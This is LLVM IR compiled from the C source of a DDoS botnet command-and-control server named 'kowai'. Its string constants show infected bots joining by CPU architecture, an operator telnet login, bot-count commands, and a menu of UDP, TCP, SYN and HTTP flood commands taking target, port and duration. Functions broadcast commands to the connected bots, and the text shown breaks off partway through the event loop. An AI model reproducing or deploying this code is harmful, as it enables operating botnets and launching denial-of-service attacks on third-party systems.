; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, [7 x i8], i8, i32 }
%struct.telnetdata_t = type { i32, i32, [20 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [55 x i8] c"\0D\0A\1B[1;33mroot\1B[0;31m@\1B[1;33mkowai\1B[1;36m \1B[1;35m~ \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c".TSCAN ON\0A\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"[kowai] Joining [ARCH:x86]\00", align 1
@.str.12 = private unnamed_addr constant [28 x i8] c"[kowai] Joining [ARCH:MIPS]\00", align 1
@.str.13 = private unnamed_addr constant [28 x i8] c"[kowai] Joining [ARCH:MPSL]\00", align 1
@.str.14 = private unnamed_addr constant [27 x i8] c"[kowai] Joining [ARCH:ARM]\00", align 1
@.str.15 = private unnamed_addr constant [27 x i8] c"[kowai] Joining [ARCH:PPC]\00", align 1
@.str.16 = private unnamed_addr constant [27 x i8] c"[kowai] Joining [ARCH:SPC]\00", align 1
@.str.17 = private unnamed_addr constant [27 x i8] c"[kowai] Joining [ARCH:ARC]\00", align 1
@.str.18 = private unnamed_addr constant [27 x i8] c"[kowai] Joining [ARCH:UNK]\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.25 = private unnamed_addr constant [25 x i8] c"%c]0;%d Connected | %s%c\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.26 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;35mUsername\1B[1;33m:\1B[37m \00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;35mPassword\1B[1;33m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [44 x i8] c"\1B[1;35m%s\1B[1;36m@\1B[1;35mkowai\1B[1;36m ~ \1B[0m\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"/total\00", align 1
@.str.39 = private unnamed_addr constant [33 x i8] c"\1B[0mkowai.total: \1B[1;35m%d\1B[0m\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"/b\00", align 1
@.str.41 = private unnamed_addr constant [49 x i8] c"\1B[1;35mkohan.arm \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [50 x i8] c"\1B[1;35mkohan.mips \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [50 x i8] c"\1B[1;35mkohan.mpsl \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [49 x i8] c"\1B[1;35mkohan.x86 \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [49 x i8] c"\1B[1;35mkohan.spc \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [49 x i8] c"\1B[1;35mkohan.ppc \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [49 x i8] c"\1B[1;35mkohan.arc \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [53 x i8] c"\1B[1;35mkohan.unknown \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [51 x i8] c"\1B[1;35mkohan.total \1B[1;35m[\1B[1;36m%d\1B[1;35m]\1B[0m\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.51 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.55 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.59 = private unnamed_addr constant [49 x i8] c"\1B[0mbtype - shows architecture of bots Joining\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.62 = private unnamed_addr constant [40 x i8] c"\1B[0m. S [TARGET] [PORT] [TIME] [SIZE]\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [48 x i8] c". HTTP [URL] [PORT] [TIME] [THREADS] [METHOD]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [37 x i8] c". U [TARGET] [PORT] [TIME] 32 0 10\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [41 x i8] c". T [TARGET] [PORT] [TIME] 32 all 0 10\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c". S\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c". U\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c". T\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c". H\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.71 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[kohan] [%s] [Sent an Attack!]\0A\00", align 1
@.str.74 = private unnamed_addr constant [32 x i8] c"[kowai] [%s] [Sent an Attack!]\0A\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.76 = private unnamed_addr constant [25 x i8] c"\1B[0mRail Gun Disarmed!\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [33 x i8] c"[kowai] [%s] [Killed All Pid's]\0A\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.80 = private unnamed_addr constant [44 x i8] c"\1B[1;35m%s\1B[1;36m@\1B[1;35mkowai\1B[1;36m#: \1B[0m\00", align 1
@.str.81 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.83 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.84 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.85 = private unnamed_addr constant [25 x i8] c"[kowai] [Admin Joining] \00", align 1
@.str.86 = private unnamed_addr constant [38 x i8] c"[kowai] [Admin Joining] [%d.%d.%d.%d]\00", align 1
@.str.87 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.88 = private unnamed_addr constant [47 x i8] c"[kowai] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.90 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.91 = private unnamed_addr constant [32 x i8] c"[kowai] Lower Threading Count.\0A\00", align 1
@.str.92 = private unnamed_addr constant [34 x i8] c"[kowai] Socket Opened On Port %d\0A\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.94 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.95 = private unnamed_addr constant [6 x i8] c"kowai\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.97 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.99 = private unnamed_addr constant [22 x i8] c"kowai could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #9
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10, !llvm.loop !8

28:                                               ; preds = %10
  br label %29

29:                                               ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

33:                                               ; preds = %29
  %34 = call i16** @__ctype_b_loc() #9
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

48:                                               ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

50:                                               ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29, !llvm.loop !9

53:                                               ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

55:                                               ; preds = %71, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %74

59:                                               ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

71:                                               ; preds = %59
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  br label %55, !llvm.loop !10

74:                                               ; preds = %55
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 0, i8* %80, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readnone willreturn
declare i16** @__ctype_b_loc() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #10
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #10
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #10
  %31 = call %struct.tm* @localtime(i64* %9) #10
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #10
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %102, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %105

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 12
  %47 = load i8, i8* %46, align 1
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 1
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %102

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 7, i32 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* %75) #8
  %77 = call i64 @send(i32 %73, i8* %74, i64 %76, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = load i8*, i8** %4, align 8
  %83 = load i8*, i8** %4, align 8
  %84 = call i64 @strlen(i8* %83) #8
  %85 = call i64 @send(i32 %81, i8* %82, i64 %84, i32 16384)
  %86 = load i32, i32* %7, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %98

88:                                               ; preds = %80
  %89 = load i32, i32* %12, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %90
  %92 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %91, i32 0, i32 1
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %88
  %96 = load i32, i32* %12, align 4
  %97 = call i64 @send(i32 %96, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.3, i64 0, i64 0), i64 46, i32 16384)
  br label %101

98:                                               ; preds = %88, %80
  %99 = load i32, i32* %12, align 4
  %100 = call i64 @send(i32 %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 1, i32 16384)
  br label %101

101:                                              ; preds = %98, %95
  br label %102

102:                                              ; preds = %101, %59
  %103 = load i32, i32* %12, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %12, align 4
  br label %35, !llvm.loop !11

105:                                              ; preds = %35
  %106 = load i8*, i8** %8, align 8
  call void @free(i8* %106) #10
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #4

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %19 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #10
  %20 = bitcast i8* %19 to %struct.epoll_event*
  store %struct.epoll_event* %20, %struct.epoll_event** %4, align 8
  br label %21

21:                                               ; preds = %1, %453
  %22 = load volatile i32, i32* @epollFD, align 4
  %23 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %24 = call i32 @epoll_wait(i32 %22, %struct.epoll_event* %23, i32 1000000, i32 -1)
  store i32 %24, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %25

25:                                               ; preds = %450, %21
  %26 = load i32, i32* %7, align 4
  %27 = load i32, i32* %6, align 4
  %28 = icmp slt i32 %26, %27
  br i1 %28, label %29, label %453

29:                                               ; preds = %25
  %30 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %31 = load i32, i32* %7, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %30, i64 %32
  %34 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 1
  %36 = and i32 %35, 8
  %37 = icmp ne i32 %36, 0
  br i1 %37, label %56, label %38

38:                                               ; preds = %29
  %39 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %39, i64 %41
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %42, i32 0, i32 0
  %44 = load i32, i32* %43, align 1
  %45 = and i32 %44, 16
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %56, label %47

47:                                               ; preds = %38
  %48 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %49 = load i32, i32* %7, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i64 %50
  %52 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 1
  %54 = and i32 %53, 1
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %155, label %56

56:                                               ; preds = %47, %38, %29
  %57 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %58 = load i32, i32* %7, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %57, i64 %59
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i32 0, i32 1
  %62 = bitcast %union.epoll_data* %61 to i32*
  %63 = load i32, i32* %62, align 1
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %64
  %66 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %65, i32 0, i32 12
  store i8 0, i8* %66, align 1
  %67 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %67, i64 %69
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %70, i32 0, i32 1
  %72 = bitcast %union.epoll_data* %71 to i32*
  %73 = load i32, i32* %72, align 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %74
  %76 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %75, i32 0, i32 4
  store i8 0, i8* %76, align 1
  %77 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %78 = load i32, i32* %7, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %77, i64 %79
  %81 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %80, i32 0, i32 1
  %82 = bitcast %union.epoll_data* %81 to i32*
  %83 = load i32, i32* %82, align 1
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %84
  %86 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %85, i32 0, i32 2
  store i8 0, i8* %86, align 1
  %87 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %88 = load i32, i32* %7, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %87, i64 %89
  %91 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %90, i32 0, i32 1
  %92 = bitcast %union.epoll_data* %91 to i32*
  %93 = load i32, i32* %92, align 1
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %94
